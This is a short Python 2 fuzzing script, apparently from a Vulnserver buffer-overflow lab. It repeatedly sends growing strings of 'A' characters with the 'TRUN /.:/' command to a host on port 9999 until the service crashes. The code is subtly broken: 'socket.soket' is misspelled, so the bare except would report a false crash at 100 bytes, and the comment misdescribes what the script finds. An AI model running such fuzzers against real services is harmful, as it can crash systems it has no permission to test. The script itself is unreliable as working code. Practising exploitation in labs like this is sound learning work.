#!/usr/bin/python
### For finding which register(?) is vulnerable to buffer overflow
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s=socket.soket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.1.90',9999))

		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()